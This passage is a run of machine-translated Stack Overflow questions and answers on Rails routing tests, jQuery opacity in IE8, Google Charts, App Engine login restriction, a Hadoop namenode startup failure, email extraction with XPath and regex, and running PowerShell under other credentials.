  assert_routing({:path => '/topics', :method => 'post'} , { :controller => "topics", :action => "create"}, {}, {}, 'could not route to create topic')
end 
```

`# routes.rb`

```
resources :topics, :only => [:new] 
```

`# terminal output`

```
$ rake test:functionals
Run options: 
```

`# Running tests:`

```
.....E.

Finished tests in 0.373543s, 18.7395 tests/s, 53.5414 assertions/s.

1) Error:
test_route_exists_to_create_topic(TopicsControllerTest):
ActionController::RoutingError: No route matches "/topics"
.../gems/ruby-1.9.3-p0/gems/actionpack-3.2.3/lib/action_dispatch/routing/route_set.rb:633:in `recognize_path'
.../gems/ruby-1.9.3-p0/gems/actionpack-3.2.3/lib/action_dispatch/testing/assertions/routing.rb:210:in `recognized_request_for'
.../gems/ruby-1.9.3-p0/gems/actionpack-3.2.3/lib/action_dispatch/testing/assertions/routing.rb:42:in `assert_recognizes'
.../gems/ruby-1.9.3-p0/gems/actionpack-3.2.3/lib/action_dispatch/testing/assertions/routing.rb:118:in `assert_routing'
        `.../myapp/test/functional/topics_controller_test.rb:25:in block in <class:TopicsControllerTest>'`

>> 7 tests, 20 assertions, 0 failures, 1 errors, 0 skips 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-22T19:30:25.987

创建`routes.rb`的路线与您的测试路线不同。如果你想路由到`:create`控制器中的动作，`routes.rb`你应该使用：

```
resources :topics, :only => [:create] 
```

请参阅 RailsGuides 中的[路由主题](http://guides.rubyonrails.org/routing.html#overriding-the-named-helpers)。

# mysql - grep first 和 sirnames 来自自由文本形式

> ID：10102628
> 
> 赞同：0
> 
> 时间：2012-04-11T08:42:42.313
> 
> 标签：mysql, perl

有没有人见过为单个或多个名称拆分字符串的好尝试？
举个例子：
用户可以将他们的名字带入表单，不幸的是它从**`John J. Johnson`**（简单），**`John/Peter Johnson`**（2人）到**`Michael Peter John Paul`**或**`Stacy Miller Kevin Mitnick`**。
到目前为止，我已经建立了一个包含名字和姓氏的数据库，我对此进行了检查。但我想知道是否有人真的试图以高命中率正确地做到这一点。

非常感谢评论。谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-11T10:53:01.597

我见过的最接近的是[Lingua::EN::NamedEntity](https://metacpan.org/release/Lingua-EN-NamedEntity)，但这是一个很难解决的问题。获得完美的解决方案可能是不可能的，但您可能会得到适合您情况的东西。

# jquery - IE 8中的fadeTo透明度问题

> ID：10102632
> 
> 赞同：1
> 
> 时间：2012-04-11T08:43:03.547
> 
> 标签：jquery, css, internet-explorer, transparency, fadeto

我遇到了让透明度在 IE8 中与fadeTo 结合使用的问题。在我的背景图像 (PNG) 上保持透明度，而不是淡入和淡出，而是有一个令人讨厌的黑色边框，否则透明度会是这样。

我已经搜索了高低，虽然这里有很多似乎很好的答案，但我找不到适合我的答案，我不知道为什么。

这是我的代码：

```
 jQuery(document).ready(function($) {

        InOut($('#bubblewrap li:first'));

        function InOut(elem) {
            elem.delay().fadeTo(1500, 1).delay(700).fadeTo(1500, 0, function() {
                if (elem.next().length > 0) {
                    InOut($(this).next());
                }
                else {
                    InOut($(this).siblings(':first'));
                }

            });
        }

        $('#bubblewrap li').mouseover(function() {
            $(this).siblings().add(this).stop(true, false).css("opacity", 0);
            $(this).show().css("opacity", 1);
        });
        $('#bubblewrap li').mouseout(function() {
            if ($(this).is(":visible") == true) {
                InOut($(this));
            }
        });
    }); 
```

有人对如何将 SO 上的一些常见解决方案应用于我的代码有任何建议吗？非常感谢任何和所有帮助。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-11T10:08:36.560

IE8（作为较老的 IE）无法处理半透明（即 png）元素的不透明度。这正是您在那里看到的。通常设置背景颜色（因此元素没有半透明像素）以及图像会有所帮助。

在您的情况下，您可以考虑 a) 不褪色，但仅在 IE<9 时显示 b) 使用 jpg 图像的一部分作为背景，并将 png 放在其上（需要额外的元素） c) 使用 css3 边框半径和框阴影重新创建效果并让 css3pie 处理它。但它可能不适合动画 - 没有尝试过。

# php - 使用 Google Charts API 的 3D 图表

> ID：10102639
> 
> 赞同：1
> 
> 时间：2012-04-11T08:43:24.123
> 
> 标签：php, charts, visualization, data-visualization

我目前正在使用 Google Chart API 创建图表。我有一个包含几个月数据的数据集。

例如：

```
{
    '1':{
        'date':'01-01-2012',
        'dow':'01', // Monday
        'profit':'326', // GBP
    }, '2':{
        'date':'02-01-2012',
        'dow':'02', // Tuesday
        'profit':'142'
    } 
} 
```

这只是我编造的一点，但想象一下这 3 个月的数据，我需要创建一个所有星期一（以及星期二、星期三等）的比较图，以显示可能有的任何盈利模式/异常发生。

我遇到的问题是

1.  我认为 Google Charts API 不能调用有用的 Z 轴。
2.  我不知道如何将所有星期几和日期成功分组（按顺序）。

所以我猜为什么会有问题，“我该怎么做？”。

这是我已经得到的截图：

![http://i.imgur.com/2LXxN.png](../Images/cf48d55055ce79c5dace5fe15cda81d2.png)

显然，这只是按顺序排列的日期，我还需要比较星期几。

任何帮助都会很棒！

谢谢！

# google-app-engine - Google App Engine 上的身份验证（网页）

> ID：10102640
> 
> 赞同：8
> 
> 时间：2012-04-11T08:43:28.867
> 
> 标签：google-app-engine, authentication, servlets, httpsession, google-openid

我想要求用户在访问我的**GAE**（Google App Engine）应用程序的某些部分时使用**登录名/密码。**我想限制对一组预定义用户的访问，例如在可以将新数据上传到数据存储区的页面上。

 **我发现 GAE 有 3 种方法可以解决这个问题，但看起来只有最后一种（最复杂的）可以解决我的问题：

1.  使用部署描述符（**`<security-constraint>`在 web.xml 中**）。这不好，因为这些用户可以访问，即使作为 GAE 应用程序管理页面的查看者，他们可以在其中查看计费历史记录、浏览数据存储、日志等，这是我必须避免的事情。

2.  使用联合登录 ( **Open ID** ) ( [https://developers.google.com/appengine/articles/openid](https://developers.google.com/appengine/articles/openid) ) 并允许用户使用他们的 Google、Yahoo! 或其他身份登录。这不是一个解决方案，因为我想限制对一小部分用户（最多 5 个）的访问，并且不允许每个人都使用该应用程序。

3.  另一种选择是创建只能通过 HTTPS 访问的简单**自定义登录页面，并让用户在 POST 请求中发送用户名和密码（它可以很简单，因为我们有安全的****https**连接）到 servlet，在 servlet 上生成一些**会话标识符**具有指定的有效性，并使其成为每个后续请求的一部分。它还需要在用户每次发送 GET 或 POST 请求时手动检查会话标识符是否存在并且同时没有过期。

关于如何维护管理员帐户的任何其他/更好的建议？可以`HttpSession`帮助解决最后一个变体吗？

亲切的问候， STeN

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-11T12:14:27.957

我建议使用标准的 Google 登录页面。在您的身份验证控制器中使用类似的东西（Java + Jersey 框架，当然不是必需的）：

```
@Path("/login")
public Response login(@Context UriInfo ui) throws Exception {
  UserService userService = UserServiceFactory.getUserService();
  com.google.appengine.api.users.User user = userService.getCurrentUser();
  Response response;
  if (user == null) {
    URI uri = new URI(userService.createLoginURL(ui.getBaseUri().toString()));
    response = Response.seeOther(uri).build();
  } else {
    URI uri = new URI("/");
    response = Response.seeOther(uri).build();
  }
  return response;
}

@GET
@Path("/logout")
public Response logout(@Context UriInfo ui) throws Exception {
  UserService userService = UserServiceFactory.getUserService();
  com.google.appengine.api.users.User user = userService.getCurrentUser();
  Response response;
  if (user == null) {
    URI uri = new URI("/");
    response = Response.seeOther(uri).build();
  } else {
    URI uri = new URI(userService.createLogoutURL(ui.getBaseUri().toString()));
    response = Response.seeOther(uri).build();
  }
  return response;
} 
```

如果用户未登录（基本上未登录），登录方法会将您的应用重定向到 Google 登录页面。注销方法将注销用户。

希望这可以帮助

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-11T09:04:41.957

一些注意事项：

1.  AFAIK 你的假设是不正确的。登录到应用程序与管理页面权限无关。您需要通过“权限”页面显式添加用户，以便他们可以访问管理页面。

2.  用户使用 OpenID 登录后，您仍然可以检查用户属性（电子邮件）并拒绝他们访问。

3.  这当然是可行的。跟踪用户的自然方式是[会话](https://developers.google.com/appengine/docs/java/config/appconfig#Enabling_Sessions)。谷歌示例。

在这两种情况下 2.' 3\. 建议有一个 servlet 过滤器，如果有用户登录则检查会话，如果用户未登录则拒绝访问（返回 404）。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-11T08:54:26.473

我使用 2 和 3 的组合。我允许所有用户登录，但我将操作限制在特定的电子邮件地址。这些可以硬编码或（更好）在数据存储和内存缓存中（这样您就不必在每个请求上查询数据存储）。如果您愿意，您还可以将此数据缓存在 Java 中的静态变量中 - 请注意，如果您更改有权访问的用户，您可能需要手动终止实例。如果像我一样，您很少/从不更改访问权限，那么这应该不是问题。

允许所有用户登录实际上使他们无法访问我的应用程序 - 他们看到管理页面，但除了一条消息说“您无权访问这些管理选项中的任何一个”之外，它们是空的。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-11T13:02:48.880

注意第三种解决方案：我的 webapp 不传递用户名和密码，而是询问用户名和 apiSecret（在第一次登录时自动生成），因此如果出现问题，您可以快速使 apiSecret 无效（并重新生成）。

还有另一种选择：OAuth (https://developers.google.com/appengine/docs/java/oauth/)。这是我的一段代码（UserAccount 是我的代表用户的类；用户是“com.google.appengine.api.users.User”，retrieveUser(..) 是从登录的“用户”中检索我的 UserAccount 的函数):

```
public UserAccount getUserLogged(HttpServletRequest request) {
    try {
        User loggedUser = oauthService.getCurrentUser();
        if(loggedUser!=null) {
            return super.userAB.retrieveUser(loggedUser);
        }
    } catch (OAuthRequestException e) {
        return null;
    }
    return null;
} 
```**

# java - 名称节点未运行

> ID：10102641
> 
> 赞同：4
> 
> 时间：2012-04-11T08:43:36.403
> 
> 标签：java, linux, jakarta-ee, hadoop, hbase

在我尝试运行hadoop时完成hadoop设置后，我发现（通过jps）namenode没有运行。我在日志文件中搜索，发现异常“目录/hadoop/tmp/dfs/name处于不一致状态：存储目录不存在或不可访问”。. 所以我通过 sudo mkdir -p /hadoop/tmp/dfs/name 在 /hadoop/tmp/dfs/name 中创建了 i 目录，并赋予了这个完整的权限。现在重新启动hadoop后，我看到namenode仍然没有运行，我发现这个异常“dFSNamesystem初始化失败.java.io.IOException：NameNode未格式化。”。我已经格式化了namenode“{hadoop-dir}/bin hadoop namenode -format”并且它的格式很好，但是namenode日志中的异常仍然存在。这里我的namenode日志如下

```
2012-04-11 13:19:09,174 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: STARTUP_MSG: 
/************************************************************
STARTUP_MSG: Starting NameNode
STARTUP_MSG:   host = hbase.com.com/192.168.15.20
STARTUP_MSG:   args = []
STARTUP_MSG:   version = 0.20.205.0
STARTUP_MSG:   build = https://svn.apache.org/repos/asf/hadoop/common/branches/branch-0.20-security-205 -r 1179940; compiled by 'hortonfo' on Fri Oct  7 06:20:32 UTC 2011
************************************************************/
2012-04-11 13:19:09,899 INFO org.apache.hadoop.metrics2.impl.MetricsConfig: loaded properties from hadoop-metrics2.properties
2012-04-11 13:19:09,959 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source MetricsSystem,sub=Stats registered.
2012-04-11 13:19:09,965 INFO org.apache.hadoop.metrics2.impl.MetricsSystemImpl: Scheduled snapshot period at 10 second(s).
2012-04-11 13:19:09,965 INFO org.apache.hadoop.metrics2.impl.MetricsSystemImpl: NameNode metrics system started
2012-04-11 13:19:10,443 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source ugi registered.
2012-04-11 13:19:10,469 WARN org.apache.hadoop.metrics2.impl.MetricsSystemImpl: Source name ugi already exists!
2012-04-11 13:19:10,490 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source jvm registered.
2012-04-11 13:19:10,492 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source NameNode registered.
2012-04-11 13:19:10,666 INFO org.apache.hadoop.hdfs.util.GSet: VM type       = 32-bit
2012-04-11 13:19:10,666 INFO org.apache.hadoop.hdfs.util.GSet: 2% max memory = 19.33375 MB
2012-04-11 13:19:10,666 INFO org.apache.hadoop.hdfs.util.GSet: capacity      = 2^22 = 4194304 entries
2012-04-11 13:19:10,666 INFO org.apache.hadoop.hdfs.util.GSet: recommended=4194304, actual=4194304
2012-04-11 13:19:11,005 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: fsOwner=com
2012-04-11 13:19:11,006 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: supergroup=supergroup
2012-04-11 13:19:11,006 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: isPermissionEnabled=false
2012-04-11 13:19:11,025 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: dfs.block.invalidate.limit=100
2012-04-11 13:19:11,026 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: isAccessTokenEnabled=false accessKeyUpdateInterval=0 min(s), accessTokenLifetime=0 min(s)
2012-04-11 13:19:11,086 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: Registered FSNamesystemStateMBean and NameNodeMXBean
2012-04-11 13:19:11,174 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: Caching file names occuring more than 10 times 
2012-04-11 13:19:11,211 ERROR org.apache.hadoop.hdfs.server.namenode.FSNamesystem: FSNamesystem initialization failed.
java.io.IOException: NameNode is not formatted.
    at org.apache.hadoop.hdfs.server.namenode.FSImage.recoverTransitionRead(FSImage.java:315)
    at org.apache.hadoop.hdfs.server.namenode.FSDirectory.loadFSImage(FSDirectory.java:97)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.initialize(FSNamesystem.java:384)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.<init>(FSNamesystem.java:358)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.initialize(NameNode.java:276)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.<init>(NameNode.java:497)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.createNameNode(NameNode.java:1268)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.main(NameNode.java:1277)
2012-04-11 13:19:11,212 ERROR org.apache.hadoop.hdfs.server.namenode.NameNode: java.io.IOException: NameNode is not formatted.
    at org.apache.hadoop.hdfs.server.namenode.FSImage.recoverTransitionRead(FSImage.java:315)
    at org.apache.hadoop.hdfs.server.namenode.FSDirectory.loadFSImage(FSDirectory.java:97)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.initialize(FSNamesystem.java:384)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.<init>(FSNamesystem.java:358)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.initialize(NameNode.java:276)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.<init>(NameNode.java:497)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.createNameNode(NameNode.java:1268)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.main(NameNode.java:1277)

2012-04-11 13:19:11,217 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: SHUTDOWN_MSG: 
/************************************************************
SHUTDOWN_MSG: Shutting down NameNode at hbase.com.com/192.168.15.20
************************************************************/
2012-04-11 13:28:38,247 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: STARTUP_MSG: 
/************************************************************
STARTUP_MSG: Starting NameNode
STARTUP_MSG:   host = hbase.com.com/192.168.15.20
STARTUP_MSG:   args = []
STARTUP_MSG:   version = 0.20.205.0
STARTUP_MSG:   build = https://svn.apache.org/repos/asf/hadoop/common/branches/branch-0.20-security-205 -r 1179940; compiled by 'hortonfo' on Fri Oct  7 06:20:32 UTC 2011
************************************************************/
2012-04-11 13:28:39,037 INFO org.apache.hadoop.metrics2.impl.MetricsConfig: loaded properties from hadoop-metrics2.properties
2012-04-11 13:28:39,101 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source MetricsSystem,sub=Stats registered.
2012-04-11 13:28:39,107 INFO org.apache.hadoop.metrics2.impl.MetricsSystemImpl: Scheduled snapshot period at 10 second(s).
2012-04-11 13:28:39,107 INFO org.apache.hadoop.metrics2.impl.MetricsSystemImpl: NameNode metrics system started
2012-04-11 13:28:39,626 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source ugi registered.
2012-04-11 13:28:39,643 WARN org.apache.hadoop.metrics2.impl.MetricsSystemImpl: Source name ugi already exists!
2012-04-11 13:28:39,667 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source jvm registered.
2012-04-11 13:28:39,672 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source NameNode registered.
2012-04-11 13:28:39,842 INFO org.apache.hadoop.hdfs.util.GSet: VM type       = 32-bit
2012-04-11 13:28:39,844 INFO org.apache.hadoop.hdfs.util.GSet: 2% max memory = 19.33375 MB
2012-04-11 13:28:39,844 INFO org.apache.hadoop.hdfs.util.GSet: capacity      = 2^22 = 4194304 entries
2012-04-11 13:28:39,844 INFO org.apache.hadoop.hdfs.util.GSet: recommended=4194304, actual=4194304
2012-04-11 13:28:40,176 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: fsOwner=com
2012-04-11 13:28:40,183 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: supergroup=supergroup
2012-04-11 13:28:40,184 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: isPermissionEnabled=false
2012-04-11 13:28:40,210 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: dfs.block.invalidate.limit=100
2012-04-11 13:28:40,211 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: isAccessTokenEnabled=false accessKeyUpdateInterval=0 min(s), accessTokenLifetime=0 min(s)
2012-04-11 13:28:40,281 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: Registered FSNamesystemStateMBean and NameNodeMXBean
2012-04-11 13:28:40,393 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: Caching file names occuring more than 10 times 
2012-04-11 13:28:40,414 INFO org.apache.hadoop.hdfs.server.common.Storage: Storage directory /hadoop/tmp/dfs/name does not exist.
2012-04-11 13:28:40,417 ERROR org.apache.hadoop.hdfs.server.namenode.FSNamesystem: FSNamesystem initialization failed.
org.apache.hadoop.hdfs.server.common.InconsistentFSStateException: Directory /hadoop/tmp/dfs/name is in an inconsistent state: storage directory does not exist or is not accessible.
    at org.apache.hadoop.hdfs.server.namenode.FSImage.recoverTransitionRead(FSImage.java:288)
    at org.apache.hadoop.hdfs.server.namenode.FSDirectory.loadFSImage(FSDirectory.java:97)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.initialize(FSNamesystem.java:384)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.<init>(FSNamesystem.java:358)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.initialize(NameNode.java:276)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.<init>(NameNode.java:497)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.createNameNode(NameNode.java:1268)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.main(NameNode.java:1277)
2012-04-11 13:28:40,429 ERROR org.apache.hadoop.hdfs.server.namenode.NameNode: org.apache.hadoop.hdfs.server.common.InconsistentFSStateException: Directory /hadoop/tmp/dfs/name is in an inconsistent state: storage directory does not exist or is not accessible.
    at org.apache.hadoop.hdfs.server.namenode.FSImage.recoverTransitionRead(FSImage.java:288)
    at org.apache.hadoop.hdfs.server.namenode.FSDirectory.loadFSImage(FSDirectory.java:97)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.initialize(FSNamesystem.java:384)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.<init>(FSNamesystem.java:358)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.initialize(NameNode.java:276)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.<init>(NameNode.java:497)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.createNameNode(NameNode.java:1268)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.main(NameNode.java:1277)

2012-04-11 13:28:40,430 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: SHUTDOWN_MSG: 
/************************************************************
SHUTDOWN_MSG: Shutting down NameNode at hbase.com.com/192.168.15.20
************************************************************/
2012-04-11 13:32:59,596 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: STARTUP_MSG: 
/************************************************************
STARTUP_MSG: Starting NameNode
STARTUP_MSG:   host = hbase.com.com/192.168.15.20
STARTUP_MSG:   args = []
STARTUP_MSG:   version = 0.20.205.0
STARTUP_MSG:   build = https://svn.apache.org/repos/asf/hadoop/common/branches/branch-0.20-security-205 -r 1179940; compiled by 'hortonfo' on Fri Oct  7 06:20:32 UTC 2011
************************************************************/
2012-04-11 13:33:00,423 INFO org.apache.hadoop.metrics2.impl.MetricsConfig: loaded properties from hadoop-metrics2.properties
2012-04-11 13:33:00,489 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source MetricsSystem,sub=Stats registered.
2012-04-11 13:33:00,495 INFO org.apache.hadoop.metrics2.impl.MetricsSystemImpl: Scheduled snapshot period at 10 second(s).
2012-04-11 13:33:00,496 INFO org.apache.hadoop.metrics2.impl.MetricsSystemImpl: NameNode metrics system started
2012-04-11 13:33:00,973 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source ugi registered.
2012-04-11 13:33:00,998 WARN org.apache.hadoop.metrics2.impl.MetricsSystemImpl: Source name ugi already exists!
2012-04-11 13:33:01,018 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source jvm registered.
2012-04-11 13:33:01,023 INFO org.apache.hadoop.metrics2.impl.MetricsSourceAdapter: MBean for source NameNode registered.
2012-04-11 13:33:01,167 INFO org.apache.hadoop.hdfs.util.GSet: VM type       = 32-bit
2012-04-11 13:33:01,167 INFO org.apache.hadoop.hdfs.util.GSet: 2% max memory = 19.33375 MB
2012-04-11 13:33:01,167 INFO org.apache.hadoop.hdfs.util.GSet: capacity      = 2^22 = 4194304 entries
2012-04-11 13:33:01,167 INFO org.apache.hadoop.hdfs.util.GSet: recommended=4194304, actual=4194304
2012-04-11 13:33:01,471 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: fsOwner=com
2012-04-11 13:33:01,474 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: supergroup=supergroup
2012-04-11 13:33:01,474 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: isPermissionEnabled=false
2012-04-11 13:33:01,493 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: dfs.block.invalidate.limit=100
2012-04-11 13:33:01,497 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: isAccessTokenEnabled=false accessKeyUpdateInterval=0 min(s), accessTokenLifetime=0 min(s)
2012-04-11 13:33:01,590 INFO org.apache.hadoop.hdfs.server.namenode.FSNamesystem: Registered FSNamesystemStateMBean and NameNodeMXBean
2012-04-11 13:33:01,748 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: Caching file names occuring more than 10 times 
2012-04-11 13:33:01,776 INFO org.apache.hadoop.hdfs.server.common.Storage: Storage directory /hadoop/tmp/dfs/name does not exist.
2012-04-11 13:33:01,787 ERROR org.apache.hadoop.hdfs.server.namenode.FSNamesystem: FSNamesystem initialization failed.
org.apache.hadoop.hdfs.server.common.InconsistentFSStateException: Directory /hadoop/tmp/dfs/name is in an inconsistent state: storage directory does not exist or is not accessible.
    at org.apache.hadoop.hdfs.server.namenode.FSImage.recoverTransitionRead(FSImage.java:288)
    at org.apache.hadoop.hdfs.server.namenode.FSDirectory.loadFSImage(FSDirectory.java:97)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.initialize(FSNamesystem.java:384)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.<init>(FSNamesystem.java:358)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.initialize(NameNode.java:276)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.<init>(NameNode.java:497)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.createNameNode(NameNode.java:1268)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.main(NameNode.java:1277)
2012-04-11 13:33:01,788 ERROR org.apache.hadoop.hdfs.server.namenode.NameNode: org.apache.hadoop.hdfs.server.common.InconsistentFSStateException: Directory /hadoop/tmp/dfs/name is in an inconsistent state: storage directory does not exist or is not accessible.
    at org.apache.hadoop.hdfs.server.namenode.FSImage.recoverTransitionRead(FSImage.java:288)
    at org.apache.hadoop.hdfs.server.namenode.FSDirectory.loadFSImage(FSDirectory.java:97)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.initialize(FSNamesystem.java:384)
    at org.apache.hadoop.hdfs.server.namenode.FSNamesystem.<init>(FSNamesystem.java:358)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.initialize(NameNode.java:276)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.<init>(NameNode.java:497)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.createNameNode(NameNode.java:1268)
    at org.apache.hadoop.hdfs.server.namenode.NameNode.main(NameNode.java:1277)

2012-04-11 13:33:01,793 INFO org.apache.hadoop.hdfs.server.namenode.NameNode: SHUTDOWN_MSG: 
/************************************************************
SHUTDOWN_MSG: Shutting down NameNode at hbase.com.com/192.168.15.20
************************************************************/ 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-04-11T17:06:11.620

这很简单——格式化你的namenode

```
mcbatyuk:hadoop bam$ bin/hadoop namenode -format
Warning: $HADOOP_HOME is deprecated.

12/04/11 21:04:55 INFO namenode.NameNode: STARTUP_MSG: 
/************************************************************
STARTUP_MSG: Starting NameNode
STARTUP_MSG:   host = mcbatyuk.local/192.168.10.102
STARTUP_MSG:   args = [-format]
STARTUP_MSG:   version = 1.0.0
STARTUP_MSG:   build = https://svn.apache.org/repos/asf/hadoop/common/branches/branch-1.0 -r 1214675; compiled by 'hortonfo' on Thu Dec 15 16:36:35 UTC 2011
************************************************************/
Re-format filesystem in /Users/bam/hadoop/name ? (Y or N) Y
Format aborted in /Users/bam/hadoop/name
12/04/11 21:04:57 INFO namenode.NameNode: SHUTDOWN_MSG: 
/************************************************************
SHUTDOWN_MSG: Shutting down NameNode at mcbatyuk.local/192.168.10.102
************************************************************/` 
```

# ruby - 使用 XPath 解析文本电子邮件地址，而不是 //A[startswith(@href, 'mailto:')]

> ID：10102642
> 
> 赞同：3
> 
> 时间：2012-04-11T08:43:38.990
> 
> 标签：ruby, xpath, nokogiri

我想从几个不同的网站中提取电子邮件地址。如果它们是活动链接格式，我可以使用

```
//A[starts-with(@href, 'mailto:')] 
```

但其中一些只是文本格式`example@domain.com`，而不是链接，所以我想选择一个包含`@`内部元素的路径

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-11T12:20:20.447

您可能想要使用[正则表达式](http://www.ruby-doc.org/core-1.9.3/Regexp.html)。它们将允许您提取电子邮件地址，无论它们在文档中的上下文如何。这是一个测试驱动的小示例，可以帮助您入门：

```
require "minitest/spec"
require "minitest/autorun"

module Extractor
  EMAIL_REGEX = /[\w]+@[\w]+\.[\w]+/

  def self.emails(document)
    (matches = document.scan(EMAIL_REGEX)).any? ? matches : false
  end
end

describe "Extractor" do
  it 'should extract an email address from plaintext' do
    emails = Extractor.emails("email@example.com")
    emails.must_include "email@example.com"
  end

  it 'should extract multiple email addresses from plaintext' do
    emails = Extractor.emails("email@example.com and email2@example2.com")
    emails.must_include "email@example.com", "email2@example2.com"
  end

  it 'should extract an email address from the href attribute of an anchor' do
    emails = Extractor.emails("<a href='mailto:email3@example3.com'>Email!</a>")
    emails.must_include "email3@example3.com"
  end

  it 'should extract multiple email addresses from both plaintext and within HTML' do
    emails = Extractor.emails("my@email.com OR <a href='mailto:email4@example4.com'>Email!</a>")
    emails.must_include "email4@example4.com", "my@email.com"
  end

  it 'should not extract an email address if there isn\'t one' do
    emails = Extractor.emails("email(at)address(dot)com")
    emails.must_equal false
  end

  it "should extract email addresses" do
    emails = Extractor.emails("email.address@domain.co.uk")
    emails.must_include "email.address@domain.co.uk"
  end
end 
```

最后一个测试失败，因为正则表达式没有预料到大多数有效的电子邮件地址。看看你是否以此为起点来提出或找到更好的正则表达式。为了帮助构建您的正则表达式，请查看[Rubular](http://rubular.com/r/eHZpt5CXlX)。

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2012-04-11T12:30:11.770

> 我想选择一个包含@ inside的元素的路径

**使用**：

```
//*[contains(., '@')] 
```

**在我看来，您真正想要的是选择具有包含“@”的文本节点子节点的元素。如果是这样，请使用：**

```
//*[contains(text(), '@')] 
```

**基于 XSLT 的验证：**

```
<xsl:stylesheet version="1.0"
 xmlns:xsl="http://www.w3.org/1999/XSL/Transform">
 <xsl:output omit-xml-declaration="yes" indent="yes"/>
 <xsl:strip-space elements="*"/>

 <xsl:template match="/">
     <xsl:copy-of select=
        "//*[contains(text(), '@')] "/>
 </xsl:template>
</xsl:stylesheet> 
```

**当此转换应用于以下 XML 文档时：**

```
<html>
 <body>
  <a href="xxx.com">xxx.com</a>
  <span>someone@xxx.com</span>
 </body>
</html> 
```

**计算 XPath 表达式并将选定节点复制到输出**：

```
<span>someone@xxx.com</span> 
```

# powershell - PowerShell - 使用不同的凭据创建新实例

> ID：10102647
> 
> 赞同：0
> 
> 时间：2012-04-11T08:44:04.983
> 
> 标签：powershell, powershell-2.0

我想使用不同的用户凭据从我的脚本中创建一个新的 PowerShell 实例。我的想法是在这个脚本部分中使用不同的凭据做一些管理工作。我想以普通用户权限执行主要部分。

想法，但不起作用：

```
$script= {$InScript = Get-Process}

$pp= get-credential

[System.Diagnostics.Process]::Start( "c:\windows\syswow64\WindowsPowerShell\v1.0\powershell.exe", "-command $script", $pp.UserName.Split('\')[1] , $pp.Password , $pp.UserName.Split('\')[0] )

